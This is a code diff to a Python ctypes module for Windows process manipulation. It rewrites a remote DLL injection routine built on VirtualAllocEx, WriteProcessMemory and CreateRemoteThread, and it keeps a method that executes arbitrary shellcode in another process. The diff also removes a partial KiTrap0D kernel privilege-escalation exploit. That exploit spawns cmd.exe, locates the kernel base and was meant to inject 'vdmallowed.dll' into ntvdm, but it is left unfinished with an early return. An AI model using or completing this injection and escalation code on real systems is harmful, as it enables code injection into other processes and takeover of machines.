@@ -239,77 +239,52 @@ started from. code is the exit code"""
                                                     )
         ctypes.windll.kernel32.CloseHandle(hToken)
 
-    def inject(self, dllpath): #inject dllpath into our process
-        """this function creates the following code:
-<dll path in unicode>
-push <address of dll path>
-mov eax, kernel32.LoadLibaryW
-call eax
-mov eax, kernel32.ExitThread
-push 0
-call eax
-
-and then executes it
-"""
+    def inject(self,dllpath):
+        """This function injects dlls the smart way
+specifying stack rather than pushing and calling"""
         dllpath = os.path.abspath(dllpath)
-        push = "\x68"
-        dllpath = "\x00".join(list(dllpath))+"\x00\x00\x00" 
-        #convert to null padded unicode
-
-        kernel32handle = self.kernel32.GetModuleHandleA("kernel32.dll")
-        loadlibraryaddress = hex(self.kernel32.GetProcAddress(
-                                 kernel32handle, "LoadLibraryW"))[2:]
-        loadlibrarycall = "\xb8" #mov eax, 
-        loadlibrarycall += binascii.unhexlify(loadlibraryaddress)[::-1] #addr
-        loadlibrarycall += "\xff\xd0" #call eax
-
-        exitaddress = binascii.unhexlify(hex(self.kernel32.GetProcAddress(
-                                       kernel32handle, "ExitThread"))[2:])[::-1]
-        exitcall = "\xb8"+exitaddress+"\x6a\x00\xff\xd0" 
-        #mov eax, push zero and call exitthread
-    
-        loadlibrarycall += exitcall #put calls together
-        loaddll = dllpath+push
-
-        codelen = len(loaddll+loadlibrarycall)+self.addrlen
-        #this is full code size for allocation
-
-        shellcodeaddress = self.kernel32.VirtualAllocEx(
-                                                        self.handle,
-                                                        None,
-                                                        codelen,
-                                                        0x1000,
-                                                        0x40
-                                                        )
-        #final shellcode in order with the start address of the path:
-        loaddll += binascii.unhexlify(hex(shellcodeaddress)[2:].rjust(self.addrlen,"0"))[::-1]
-        loaddll += loadlibrarycall
+        LoadLibraryA = self.kernel32.GetProcAddress(
+                            self.kernel32.GetModuleHandleA("kernel32.dll"),
+                            "LoadLibraryA")
+        RemotePage = self.kernel32.VirtualAllocEx(
+                                                self.handle,
+                                                None,
+                                                len(dllpath)+1,
+                                                0x1000,
+                                                0x40
+                                                )
         self.kernel32.WriteProcessMemory(
                                         self.handle,
-                                        shellcodeaddress,
-                                        loaddll,
-                                        len(loaddll),
+                                        RemotePage,
+                                        dllpath,
+                                        len(dllpath),
                                         None
                                         )
-        thread = self.kernel32.CreateRemoteThread(
-                                        self.handle,
-                                        None,
-                                        0,
-                                        shellcodeaddress+len(dllpath),
-                                        None,
-                                        0,
-                                        None
-                                        )
+        RemoteThread = self.kernel32.CreateRemoteThread(
+                                                        self.handle,
+                                                        None,
+                                                        0,
+                                                        LoadLibraryA,
+                                                        RemotePage,
+                                                        0,
+                                                        None
+                                                        )
         self.kernel32.WaitForSingleObject(
-                                        thread,
+                                        RemoteThread,
                                         -1
+                                        )
+        exitcode = wintypes.DWORD(0)
+        self.kernel32.GetExitCodeThread(
+                                        RemoteThread,
+                                        ctypes.byref(exitcode)
                                         )
         self.kernel32.VirtualFreeEx(
                                     self.handle,
-                                    shellcodeaddress,
-                                    len(loaddll),
+                                    RemotePage,
+                                    len(dllpath),
                                     0x8000
                                     )
+        return exitcode.value
 
     def injectshellcode(self, shellcode):
         """This function merely executes what it is given"""
@@ -351,84 +326,3 @@ and then executes it
                                         code
                                         )
         self.kernel32.CloseHandle(self.handle)
-
-
-def get_kernel_addr():
-    ntdll = ctypes.windll.ntdll
-    buffer_size = wintypes.ULONG(0)
-    ntdll.ZwQuerySystemInformation(11, 0, 0, ctypes.byref(buffer_size));
-
-    sysmod_info = ctypes.create_string_buffer(buffer_size.value)
-    ntdll.ZwQuerySystemInformation(11, ctypes.byref(sysmod_info), buffer_size.value, ctypes.byref(buffer_size));
-	
-    mod_list = ctypes.cast(sysmod_info, ctypes.POINTER(wintypes.SYSTEM_MODULE_INFORMATION))
-    return (mod_list[0].BaseAddress, mod_list[0].ImageName.split('\\')[-1], mod_list[0].Size)
-
-def kitrap0d():
-    kernel32 = ctypes.windll.kernel32
-    
-    startupinfo = wintypes.STARTUPINFO()
-    process_information = wintypes.PROCESS_INFORMATION()
-    startupinfo.dwFlags = 0x1
-    startupinfo.wShowWindow = 0x1
-    startupinfo.cb = ctypes.sizeof(startupinfo)
-    kernel32.CreateProcessA(
-                            "C:\\WINDOWS\\system32\\cmd.exe",
-                            "C:\\WINDOWS\\system32\\cmd.exe",
-                            None,
-                            None,
-                            False,
-                            0x00000010,
-                            None,
-                            None,
-                            ctypes.byref(startupinfo),
-                            ctypes.byref(process_information)
-                            )
-    givesys = process_information.dwProcessId
-
-    kernbase, kernimage, kernsize = get_kernel_addr()
-    kernhandle = kernel32.LoadLibraryA(kernimage)
-    xpsig = "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84"
-    dos_header = ctypes.cast(kernhandle, ctypes.POINTER(wintypes.IMAGE_DOS_HEADER))
-    nt_header = ctypes.cast(kernhandle + dos_header.contents.e_lfanew, ctypes.POINTER(wintypes.IMAGE_NT_HEADER))
-    optional_header = nt_header.contents.OptionalHeader
-    baseofcode = optional_header.BaseOfCode
-    sizeofcode = optional_header.SizeOfCode
-    buf = ctypes.c_byte*kernsize
-    kernelarray = ctypes.cast(kernhandle, ctypes.POINTER(buf)).contents
-    #i = OptHeader->BaseOfCode; i < OptHeader->SizeOfCode; i++
-    #&ImageBase[i] = kernel handle
-    #kernoff = i at start of xpsig
-    return
-    
-    
-
-    kernel32.SetEnvironmentVariable("VDM_TARGET_PID",hex(givesys))
-    kernel32.SetEnvironmentVariable("VDM_TARGET_KRN",hex(kernbase))
-    kernel32.SetEnvironmentVariable("VDM_TARGET_OFF",hex(kernoff))
-
-    startupinfo = wintypes.STARTUPINFO()
-    process_information = wintypes.PROCESS_INFORMATION()
-    startupinfo.dwFlags = 0x1
-    startupinfo.wShowWindow = 0x0
-    startupinfo.cb = ctypes.sizeof(startupinfo)
-    kernel32.CreateProcessA(
-                            "C:\\WINDOWS\\system32\\debug.exe",
-                            None,
-                            None,
-                            None,
-                            True,
-                            0x00000004,
-                            None,
-                            None,
-                            ctypes.byref(startupinfo),
-                            ctypes.byref(process_information)
-                            )
-    ntvdm = kernel32.OpenProcess(
-                        0x43b,
-                        False,
-                        process_information.dwProcessId
-                        )
-    
-    ntvdminject = Process(handle=ntvdm)
-    ntvdminject.inject("vdmallowed.dll")
